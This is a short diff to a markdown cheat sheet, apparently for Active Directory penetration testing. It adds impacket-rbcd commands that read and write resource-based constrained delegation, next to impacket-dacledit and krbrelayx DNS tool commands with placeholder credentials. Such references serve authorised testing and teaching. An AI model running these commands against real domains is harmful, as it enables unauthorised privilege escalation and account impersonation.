@@ -190,6 +190,10 @@ impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target-dn 'DN' -a
 ```
 - impacket-owneredit
 - impacket-rbcd
+```sh
+impacket-rbcd -delegate-to 'COMPUTERNAME' -action 'read' -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
+ impacket-rbcd -delegate-to 'COMPUTERNAME' -delegate-from 'COMPUTERNAME' -action 'write' -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
+```
 - krbrelayx ![GitHub Repo stars](https://img.shields.io/github/stars/dirkjanm/krbrelayx?style=social)
 ```sh
 python3.13 krbrelayx/dnstool.py -u 'DOMAIN\USERNAME' -p 'PASSWORD' -a query -r 'RECORD_NAME' 'IP'
